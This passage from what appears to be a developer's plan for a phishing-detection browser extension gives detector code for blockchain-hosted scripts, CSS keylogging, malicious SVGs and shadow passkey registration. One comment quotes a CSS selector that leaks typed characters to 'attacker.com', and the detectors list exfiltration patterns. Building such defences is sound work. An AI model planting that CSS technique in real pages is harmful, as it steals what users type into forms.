EtherHiding — where the malicious payload JS is hosted on BNB Smart Chain contracts and
loaded via `eth_call` to `cloudflare-eth.com` or similar Web3 RPC endpoints.

```javascript
// Add to ClipboardDefender in service_worker.js

// EtherHiding detection: malicious JS served from blockchain RPC endpoints
const BLOCKCHAIN_RPC_PATTERNS = [
  /cloudflare-eth\.com/i,
  /eth-mainnet\.g\.alchemy\.com/i,
  /bsc-dataseed[1-4]\.binance\.org/i,
  /polygon-rpc\.com/i,
  /rpc\.ankr\.com/i,
];

// Monitor network requests for Web3 RPC calls fetching JS content
chrome.webRequest.onCompleted.addListener(
  (details) => {
    const url = details.url;
    const isBlockchainRPC = BLOCKCHAIN_RPC_PATTERNS.some(p => p.test(url));

    if (isBlockchainRPC && details.type === 'script') {
      // Script loaded directly from a blockchain RPC = EtherHiding
      emitPhishingAlert({
        type:      'ETHERHIDING_BLOCKCHAIN_HOSTED_SCRIPT',
        severity:  'Critical',
        riskScore: 0.90,
        url:       details.initiator,
        signals:   [`script_from_blockchain_rpc: ${url}`],
        detail:    'Script loaded from Web3/blockchain RPC endpoint (EtherHiding pattern). ' +
                   'Malicious JavaScript hosted in smart contract storage to evade takedowns.',
        mitre:     'T1027.010 — Obfuscated Files: Command Obfuscation via Blockchain',
      });
    }
  },
  { urls: ['<all_urls>'] },
  ['responseHeaders']
);
```

---

### S4-C: StyleAuditor — CSS Keylogging / Exfiltration Detection
**Effort:** 4–6 weeks | **New file:** `extension/content/style_auditor.js`

```javascript
// extension/content/style_auditor.js
// StyleAuditor — CSS-only data exfiltration / keylogging detection
// Source: PortSwigger Research 2023, BH Europe 2025 "CSS Sidechannels"
// Technique: input[value^="a"] { background: url(attacker.com/?c=a) }

'use strict';

const StyleAuditor = (() => {

  // Patterns indicating CSS attribute-selector sidechannel exfiltration
  const SUSPICIOUS_CSS_PATTERNS = [
    // input value attribute selector (char-by-char exfil)
    /input\[value[\^$*~|]?=["'][a-z0-9]["']\]\s*\{[^}]*url\(/gi,
    // :has() selector monitoring (BH Europe 2025)
    /input:has\(\[value[^\]]*\]\)\s*\{[^}]*url\(/gi,
    // attribute presence combined with external image load
    /\[type=["']password["']\][^{]*\{[^}]*url\(['"]https?:\/\/(?!fonts\.googleapis)/gi,
  ];

  // Monitor <style> elements and <link rel="stylesheet"> for suspicious rules
  function auditStylesheet(cssText, source) {
    const findings = [];
    for (const pattern of SUSPICIOUS_CSS_PATTERNS) {
      const matches = cssText.match(pattern);
      if (matches) {
        findings.push({ pattern: pattern.toString(), matches, source });
      }
    }
    return findings;
  }

  function checkAllStylesheets() {
    const findings = [];

    // Inline <style> elements
    document.querySelectorAll('style').forEach(el => {
      const f = auditStylesheet(el.textContent, 'inline_style');
      findings.push(...f);
    });

    // External stylesheets (accessible if same-origin or CORS-allowed)
    document.querySelectorAll('link[rel="stylesheet"]').forEach(async (link) => {
      try {
        const resp = await fetch(link.href);
        if (resp.ok) {
          const css = await resp.text();
          const f   = auditStylesheet(css, link.href);
          findings.push(...f);
        }
      } catch { /* CORS restriction — can't inspect */ }
    });

    if (findings.length > 0) {
      chrome.runtime.sendMessage({
        type:      'PHISHING_ALERT',
        detector:  'StyleAuditor',
        subtype:   'CSS_SIDECHANNEL_EXFILTRATION_PATTERN',
        severity:  'High',
        riskScore: 0.75,
        url:       window.location.href,
        signals:   findings.map(f => 'css_attribute_selector_exfiltration'),
        detail:    `CSS-only data exfiltration pattern detected. ` +
                   `Attribute selector sidechannel can steal form contents without JavaScript.`,
        mitre:     'T1056.001 — Input Capture: Keylogging',
        findings:  findings.slice(0, 3),
      });
    }
  }

  document.addEventListener('DOMContentLoaded', checkAllStylesheets);
  new MutationObserver(checkAllStylesheets)
    .observe(document.head, { childList: true, subtree: true });

  return {};
})();
```

---

## ONGOING — Intelligence Pipeline Maintenance

These are not one-time builds but recurring tasks that keep PhishOps current.

### KitRadar Post-Tycoon Fingerprint Refresh
**Frequency:** Monthly after any major PhaaS takedown
**What to do:**

1. Monitor Any.run `threatName:"Tycoon"` search (direct link in THREAT_INTELLIGENCE.md)
   for new samples post-Europol
2. For each new sample: extract HTML, run through `kitphishr` patterns, extract new IOC
3. Update `lure/rules/phishing_custom.yar` with new fingerprint YARA rules:
   - New AES key/IV pairs (Tycoon embeds these statically)
   - New Canvas fingerprinting JS patterns
   - New Base64+XOR obfuscation keys
4. Update KitRadar IOK rules in `extension/background/service_worker.js`

```bash
# Workflow script: kitradar/refresh_tycoon_fingerprints.sh
# Run monthly or after any Europol/law enforcement PhaaS takedown

#!/bin/bash
echo "[*] Pulling latest Tycoon 2FA samples from Any.run..."
# Query Any.run TI Lookup API for recent Tycoon samples
curl -H "Authorization: API-Key $ANYRUN_API_KEY" \
  "https://intelligence.any.run/analysis/lookup/?query=threatName:Tycoon&dateRange=30" \
  | jq '.results[].url' | while read url; do
    echo "[+] Analysing: $url"
    # Extract HTML, run kitphishr, update fingerprints
  done
```

### SVG/XML Phishing Inspection — Lure CLI Addition
**Effort:** 1 week | **Add to:** `lure/lure/modules/extractor.py`

```python
# SVG phishing detection (T1027.017) — eSentire Feb 2025, Sublime Security May 2025
# SVGs contain embedded XML that can include JavaScript, fetch calls, and auto-exec

import xml.etree.ElementTree as ET

def analyse_svg_attachment(svg_bytes: bytes) -> dict | None:
    """Detect malicious SVG with embedded JS or credential harvesting."""
    try:
        root = ET.fromstring(svg_bytes)
        ns   = 'http://www.w3.org/2000/svg'
        signals = []

        # Script elements in SVG
        scripts = root.findall(f'.//{{{ns}}}script') + root.findall('.//script')
        if scripts:
            signals.append(f'svg_embedded_script_count_{len(scripts)}')
            for s in scripts:
                text = s.text or ''
                if 'fetch(' in text or 'XMLHttpRequest' in text:
                    signals.append('svg_script_network_request')
                if 'fromCharCode' in text or 'atob(' in text:
                    signals.append('svg_script_obfuscation')

        # foreignObject with form elements (credential harvesting in SVG)
        foreign = root.findall(f'.//{{{ns}}}foreignObject')
        for fo in foreign:
            if fo.find('.//{http://www.w3.org/1999/xhtml}input') is not None:
                signals.append('svg_foreignobject_credential_form')

        # Embedded data: URIs (HTML smuggling inside SVG)
        for el in root.iter():
            href = el.get('href') or el.get('{http://www.w3.org/1999/xlink}href') or ''
            if href.startswith('data:text/html') or href.startswith('data:application/zip'):
                signals.append('svg_embedded_html_blob_smuggling')

        if signals:
            return {'type': 'SVG_PHISHING_PAYLOAD', 'signals': signals,
                    'weight': 4.0 if 'svg_foreignobject_credential_form' in signals else 2.5}
    except ET.ParseError:
        pass
    return None
```

### Shadow Passkey Registration Monitor — CTAPGuard Addition
**Effort:** 1 week | **Add to:** CTAPGuard section of `service_worker.js`

```javascript
// Shadow Passkey Registration — DEF CON 32 research
// Attackers register a secondary device key during an active session for persistence

(function monitorCredentialsCreate() {
  const origCreate = navigator.credentials.create.bind(navigator.credentials);

  navigator.credentials.create = async function(options) {
    // Check if we're in an authenticated session context (post-login)
    const isPostLogin = document.cookie.includes('ESTSAUTH') ||
                        document.cookie.includes('oid') ||
                        sessionStorage.getItem('loggedIn');

    if (isPostLogin && options?.publicKey) {
      // Passkey registration during an active session = shadow passkey attempt
      chrome.runtime.sendMessage({
        type:      'PHISHING_ALERT',
        detector:  'CTAPGuard',
        subtype:   'SHADOW_PASSKEY_REGISTRATION_DURING_SESSION',
        severity:  'High',
        riskScore: 0.80,
        url:       window.location.href,
        signals:   ['webauthn_create_during_active_authenticated_session'],
        detail:    'WebAuthn credential registration during active session. ' +
                   'Possible shadow passkey registration for persistent AiTM access. ' +
                   'DEF CON 32 research: "Shadow Passkeys: Persistence via WebAuthn"',
        rpId:      options.publicKey.rp?.id || window.location.hostname,
      });
    }

    return origCreate(options);
  };
})();
```

---

## Portfolio Narrative — How to Present This Work

Each sprint maps to a clear portfolio story for job applications and GitHub profile:

| Sprint | Portfolio Headline | Evidence |
|--------|--------------------|----------|
| Sprint 0 | "Ships in days, not months" | 4 gaps closed in 1 week from research |
| Sprint 1 | "AI-era detection architecture" | LLMScorer addresses 1,265% AI phishing surge |
| Sprint 2 | "Covers the entire AiTM landscape including EvilnoVNC" | Only open-source tool detecting noVNC AiTM class |
| Sprint 3 | "Browser-to-SIEM phishing detection for Microsoft Teams" | Microsoft DART documented exact TTPs March 16, 2026 |
| Sprint 4 | "Web3 phishing detection at the transaction layer" | DrainerGuard: no open-source competition; $1.5B Bybit context |
| Ongoing | "Living intelligence pipeline, not a static tool" | Dated KitRadar refresh workflow, Europol takedown response |

---

## Tracking Sheet

Copy this into a task tracker (Linear, Notion, GitHub Projects):

```
SPRINT 0 (Days 1–5)
[ ] S0-A: CTAPGuard FIDO downgrade rule          Day 1–2
[ ] S0-B: Lure CLI IPFS detection                Day 2–3
[ ] S0-C: PhishVision LOTL signal                Day 3–4
[ ] S0-D: DocuSign YARA rule                     Day 4–5
[ ] Add tests for all 4 above                    Day 5

SPRINT 1 (Weeks 1–3)
[ ] S1-A: LLMScorer module (Python)              Week 1
[ ] S1-A: Wire into Lure CLI Stage E             Week 2
[ ] S1-A: Tests + CI integration                 Week 2
[ ] S1-B: Honeytoken generator CLI               Week 2–3
[ ] S1-B: Deploy instructions for Entra ID       Week 3

SPRINT 2 (Weeks 3–6)
[ ] S2-A: VNCGuard content script                Week 3–4
[ ] S2-A: Suricata rules for noVNC               Week 4
[ ] S2-A: KQL for Teams + VNC correlation        Week 4
[ ] S2-B: ManifestAuditor content script         Week 4–5
[ ] S2-B: Sigma rule for Sysmon PWA install      Week 5
[ ] S2-B: Tests for both modules                 Week 6

SPRINT 3 (Weeks 6–10)
[ ] S3-A KQL-01: External Teams sender           Week 6
[ ] S3-A KQL-02: Teams→Auth correlation          Week 6
[ ] S3-A KQL-03: Quick Assist abuse              Week 6–7
[ ] S3-A: Browser content script teams_guard.js Week 7–8
[ ] S3-A: Graph API monitor script               Week 8–9
[ ] S3-B: TPA Sentinel redirect chain monitor    Week 9–10

SPRINT 4 (Weeks 10–16)
[ ] S4-A: DrainerGuard EIP-7702 interceptor      Week 10–12
[ ] S4-A: Permit2 signature monitor              Week 12–13
[ ] S4-B: EtherHiding blockchain RPC detection   Week 13–14
[ ] S4-C: StyleAuditor CSS exfil detection       Week 14–16

ONGOING (Monthly)
[ ] KitRadar fingerprint refresh
[ ] SVG/XML inspection module update
[ ] Shadow passkey monitor updates
[ ] THREAT_INTELLIGENCE.md update with new sources
[ ] YARA rule validation against Any.run samples
```

---

*PhishOps Execution Plan — March 2026*
*Total new modules: 13 | Estimated total build time: 14–16 weeks at 1-person cadence*
*Existing tools enhanced: Lure CLI, PhishVision, CTAPGuard, ClipboardDefender, KitRadar*
